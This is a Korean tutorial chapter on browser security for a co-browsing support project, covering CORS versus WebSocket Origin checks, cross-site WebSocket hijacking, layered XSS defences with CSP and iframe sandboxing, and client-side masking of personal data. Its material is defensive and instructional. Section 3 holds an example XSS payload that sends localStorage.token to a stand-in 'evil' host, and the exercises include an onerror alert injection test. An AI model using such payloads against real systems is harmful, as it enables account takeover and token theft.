# 22. 브라우저 보안과 개인정보 — CORS vs WebSocket Origin · XSS · CSP · iframe sandbox · 마스킹

## 이 장의 목표
- **CORS** 와 **WebSocket Origin 검사**가 이름만 비슷하고 동작이 다르다는 것을 실측으로 설명할 수 있다.
- ★ CSWSH(교차 사이트 WebSocket 탈취)가 무엇이고 이 프로젝트가 어떻게 막는지 안다.
- 상담사 콘솔이 **고객 데이터를 믿지 않아야 하는** 이유(XSS)와 방어 겹(소독 → innerHTML 금지 → sandbox → CSP)을 설명할 수 있다.
- 개인정보 마스킹을 **어디서** 해야 하는지 말할 수 있다.

## 프로젝트에서 이 장의 자리
화면 공유는 보안적으로 아주 민감하다: 고객의 개인정보가 흐르고(마스킹), 상담사 브라우저가 고객이 보낸 HTML 을 그린다(XSS).
최종 서버의 `CorsConfig`·`StompConfig`, SDK 의 `masking.ts`·`sanitize.ts`·`mirror.ts`, 상담사 콘솔의 CSP 가 이 장의 코드다.

---

## 1. CORS vs WebSocket Origin 검사 (실측)

`cobrowse-server` 를 `CHAT_ALLOWED_ORIGINS=http://localhost:5173` 로 띄우고 curl 로 `Origin` 헤더를 바꿔 가며 보낸 결과:

| 요청 | Origin 헤더 | 결과 |
|---|---|---|
| `GET /api/public/node` (CORS 적용) | `http://localhost:5173` (허용) | 200 + `Access-Control-Allow-Origin: http://localhost:5173` |
| 〃 | `http://localhost:5174` (비허용) | **403 "Invalid CORS request"** (Spring 이 거절) |
| WebSocket 핸드셰이크 `/ws` | 허용 | **101** |
| 〃 | 비허용 | **403** |
| 〃 | **없음** (curl, Node, 서버) | **101** ← 통과 |

| | CORS | WebSocket Origin 검사 |
|---|---|---|
| 무엇을 보호하나 | 다른 사이트의 JS 가 **HTTP 응답을 읽는 것** | 다른 사이트의 JS 가 **연결을 여는 것** |
| 브라우저의 역할 | 응답에 허용 헤더가 없으면 JS 에게 안 보여 줌 (원래의 집행자) | Origin 헤더를 붙여 줄 뿐, 연결은 그냥 연다 |
| 서버의 역할 | 허용 헤더를 붙임 (Spring 은 비허용 Origin 을 403 으로 거절까지 한다) | **직접 검사해서 403** — 안 하면 아무나 연결 |
| 사전 요청(preflight) | PUT·사용자 정의 헤더 등은 OPTIONS 먼저 | 없음 |
| Spring 설정 | `CorsRegistry.addMapping(...).allowedOriginPatterns(...)` | `registry.addEndpoint("/ws").setAllowedOriginPatterns(...)` |
| 공통 한계 | Origin 은 **브라우저가** 붙인다 → curl·서버·변조된 클라이언트는 마음대로 → **인증을 대신할 수 없다** ||

## 2. ★ CSWSH — 교차 사이트 WebSocket 탈취

```
상담사가 로그인된 상태(쿠키 세션)로 evil.com 방문
evil.com 의 JS: new WebSocket('wss://chat.our.com/ws')
  → 브라우저가 chat.our.com 쿠키를 자동으로 붙인다 (WebSocket 은 CORS 보호를 안 받는다)
  → 서버가 쿠키만으로 인증한다면: evil.com 이 상담사로 로그인된 연결을 얻음 → 고객 화면 엿보기
```
이 프로젝트의 방어 (두 겹):
1. **Origin 허용 목록** — 핸드셰이크에서 evil.com 은 403.
2. **쿠키가 아니라 STOMP CONNECT 의 Bearer 토큰** — 토큰은 JS 가 명시적으로 넣어야 하고, evil.com 은 우리 토큰을 모른다 (10·12장).

## 3. XSS — 상담사 콘솔은 고객 데이터를 믿지 않는다

악의적인 고객(또는 변조된 SDK)이 이런 스냅샷을 보낸다고 하자:
```json
{"tag":"img","attrs":{"src":"x","onerror":"fetch('https://evil/'+localStorage.token)"}}
```
상담사 콘솔에서 이게 실행되면 **상담사 계정**이 털린다. 고객이 공격자가 될 수 있다.

방어 겹 (하나가 뚫려도 다음이 막는다 — defense in depth):

| 겹 | 무엇을 | 코드 |
|---|---|---|
| ① 고객 쪽 직렬화에서 제거 | script, on*, javascript:, base, meta refresh | `serializer.ts` |
| ② **받는 쪽에서 다시 소독** | 같은 규칙을 Mirror 가 다시 적용 + 이상한 태그명 거부 + iframe 제거 | `mirror.ts` `buildElement`, `sanitize.ts` |
| ③ `innerHTML` 금지 | `createElement` + 소독한 `setAttribute` 로만 → 텍스트 속 `<img onerror>` 는 그냥 글자 | `mirror.ts` |
| ④ iframe sandbox | `allow-scripts` 없음 → 혹시 남아도 실행 불가 | `apps/agent/index.html` |
| ⑤ **CSP** | `script-src 'self'` → 인라인·외부 스크립트 실행 금지. 복제 iframe(about:blank)도 이 정책을 **물려받는다** | `apps/agent/index.html` 의 meta |
| ⑥ 콘솔 자체 코드 | 고객 ID 같은 문자열을 `innerHTML` 에 넣지 않기 (`main.ts` 의 방 목록은 `textContent`) | `apps/agent/main.ts` |

테스트: `web/sdk/test/mirror-security.test.ts` — script, onerror, `JaVa\nScRiPt:`, meta refresh, iframe srcdoc, 태그명 주입, 텍스트 속 태그.

### CSP 를 읽어 보자 (`web/apps/agent/index.html`)
```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' http: https:;
img-src * data: blob:; font-src * data:; connect-src 'self' ws: wss: http://localhost:*;
frame-src 'self' about:; object-src 'none'; base-uri 'none'; form-action 'none'
```
- 이미지·스타일을 넓게 연 이유: 고객사 사이트의 이미지·CSS 를 받아야 한다. **트레이드오프**: 상담사 브라우저가 고객사 서버에 요청 → 상담사 IP 가 고객사 로그에 남는다 (⏭ 프록시 경유는 고급).
- 운영에서는 meta 대신 **HTTP 응답 헤더**로 보내는 것이 정석이다 (meta 로는 `frame-ancestors` 등 일부를 못 쓴다).

## 4. 개인정보 마스킹 — 어디서?

| 위치 | 가능? | 문제 |
|---|---|---|
| **고객 브라우저 (SDK, 보내기 전)** | **O** | — |
| 서버 | X | 이미 네트워크를 탔고, 서버 로그·메모리·Hazelcast 에 원문이 남는다. 게다가 압축·조각이라 서버는 내용을 **볼 수도 없다** |
| 상담사 화면에서 가리기 | X | 개발자도구 한 번이면 원문 |

규칙 (`masking.ts`):
- 기본: `input[type=password]`, `autocomplete^="cc-"`(카드), `[data-cobrowse-mask]`(조상 포함 → 문단 텍스트까지)
- `[data-cobrowse-block]`: 통째로 회색 상자 (계좌 목록 등)
- `maskAllInputs`: 모든 입력값 (금융권 기본값으로 흔함)
- 고객사가 추가: `mask: { maskSelectors: ['#memo'] }` (고객 페이지 예제)
- 값은 길이를 유지하며 `•` 로. 트레이드오프: 길이 자체가 정보일 수 있다.
- **입력 경로 전부**에 적용: 스냅샷(captureFormState), 속성 변경(attr value), 텍스트 변경, input 이벤트, **ack 프레임**까지.
- 원격 조작도 막는다: 보호 필드에는 상담사가 입력할 수 없다 (17장).

e2e 가 확인: 주민번호·카드번호 원문이 상담사 화면에 없음, 계좌 영역은 placeholder, 재연결 후에도 마스킹 유지.

---

## 코드 읽기
- `server/cobrowse-server/.../config/CorsConfig.java`, `StompConfig.registerStompEndpoints`
- `web/sdk/src/masking.ts`, `sanitize.ts`, `serializer.ts`(attributesOf, captureFormState), `recorder.ts`(attr·text 경로의 마스킹)
- `web/sdk/src/mirror.ts`(buildElement), `web/apps/agent/index.html`(CSP, sandbox)
- 테스트: `serializer.test.ts`(마스킹), `mirror-security.test.ts`(XSS), `remote-control.test.ts`(보호 필드)

## 직접 해 보기
```bash
# 1) CORS vs WS Origin — 위 표를 직접 재현
./gradlew :server:cobrowse-server:bootJar -q
CHAT_ALLOWED_ORIGINS=http://localhost:5173 SERVER_PORT=18090 java -jar server/cobrowse-server/build/libs/cobrowse-server.jar &
curl -i localhost:18090/api/public/node -H 'Origin: http://localhost:5174'
curl -i --max-time 2 localhost:18090/ws -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' \
     -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Origin: http://localhost:5174'
# Origin 줄을 지우고 다시 → 101

# 2) 브라우저로: npm run dev 와 npm run dev:other-origin(5174)을 함께 띄우고,
#    서버를 CHAT_ALLOWED_ORIGINS=http://localhost:5173 으로 실행 → 5174 의 고객 페이지에서 "상담 시작"을 누르면
#    토큰 발급(HTTP)은 되지만 WebSocket 이 403 으로 거절되어 재연결만 반복하는 것 확인
#    (Vite 프록시는 Origin 헤더를 바꾸지 않으므로 서버에는 Origin: http://localhost:5174 가 도착한다)
```
3. 상담사 콘솔 개발자도구 콘솔에서 `document.querySelector('#mirror').contentDocument.body.innerHTML += '<img src=x onerror=alert(1)>'` → alert 가 뜨나? (sandbox·CSP)
4. 고객 페이지 문의사항(#memo)에 아무거나 입력 → 상담사 화면에서 `•••`.

## 자주 하는 실수
- "CORS 설정했으니 WebSocket 도 안전" — 아니다.
- Origin 검사만으로 인증을 대신함 — Origin 헤더는 브라우저 밖에서 위조된다.
- 상담사 콘솔에서 고객 데이터를 `innerHTML` 로 넣음.
- 마스킹을 서버나 상담사 화면에서 하려 함.
- iframe 에 `allow-scripts allow-same-origin` 을 함께 줌.

## 확인 질문
1. 상담사 콘솔에 CSP 가 있으면 소독 코드는 없어도 되나?
2. evil.com 이 우리 서버로 WebSocket 을 열면 무슨 일이 일어나나? 쿠키 인증이었다면?
3. 서버에서 마스킹할 수 없는 기술적 이유 두 가지는?

<details><summary>답</summary>

1. 아니다. CSP 는 마지막 겹이다. 브라우저 지원·설정 실수·우회 가능성이 있으므로 여러 겹을 유지한다.
2. 핸드셰이크에서 Origin 검사로 403. 쿠키 인증이었고 Origin 검사가 없었다면 상담사 권한의 연결을 얻었을 것(CSWSH).
3. (1) 서버에 도착한 시점에 이미 원문이 네트워크·서버 메모리를 지났다. (2) 압축·조각된 데이터라 서버가 내용을 해석하지 않는다(설계상 해석하지 않는 것이 성능·보안에 유리).
</details>

## 연습
- `exercises/src/01-origin.ts` 의 `isAllowedOrigin` (접두어 함정), `exercises/src/09-mask.ts`

다음 → [23. 다중 서버와 Hazelcast](../23-multi-server-hazelcast/)
